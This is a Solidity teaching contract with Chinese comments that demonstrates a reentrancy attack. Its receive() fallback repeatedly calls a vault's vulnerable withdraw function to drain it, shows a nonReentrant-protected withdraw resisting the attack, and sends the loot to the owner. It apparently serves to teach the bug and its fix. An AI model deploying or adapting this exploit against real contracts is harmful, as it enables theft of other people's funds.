// 小偷合约：专用来攻击银行
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
function deposit() external payable;
function vulnerableWithdraw() external;
function safeWithdraw() external;
}

contract GoldThief {
IVault public targetVault;   //连接银行：指向目标银行
address public owner;    //谁控制小偷
uint public attackCount;    //攻击了几次
bool public attackingSafe;   //判断：攻击漏洞函数or安全函数

constructor(address _vaultAddress) {
    targetVault = IVault(_vaultAddress);
    owner = msg.sender;
}

// 【重点】攻击漏洞函数。流程1）存钱进银行；2）调用withdraw；3）利用漏洞疯狂偷钱
function attackVulnerable() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

    attackingSafe = false;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();    //先存1ETH
    targetVault.vulnerableWithdraw();    //开始取钱
}

function attackSafe() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH");

    attackingSafe = true;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.safeWithdraw();
}

// 【攻击核心】receive函数（最关键）
receive() external payable {    //当收到钱时自动触发
    attackCount++;    //记录次数

    // 漏洞版本：银行的钱被偷光
    if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {   //条件成立
        targetVault.vulnerableWithdraw();    //再次调用
    }    //取钱→触发receive→再取钱→无限循环

    // 安全版本：
    if (attackingSafe) {    //调用：
        targetVault.safeWithdraw(); // This will fail due to nonReentrant（因为nonReentrant锁住了）
    }
}

// 把钱拿走：把偷到的钱转给自己
function stealLoot() external {
    require(msg.sender == owner, "Only owner");
    payable(owner).transfer(address(this).balance);
}

function getBalance() external view returns (uint256) {
    return address(this).balance;
}
}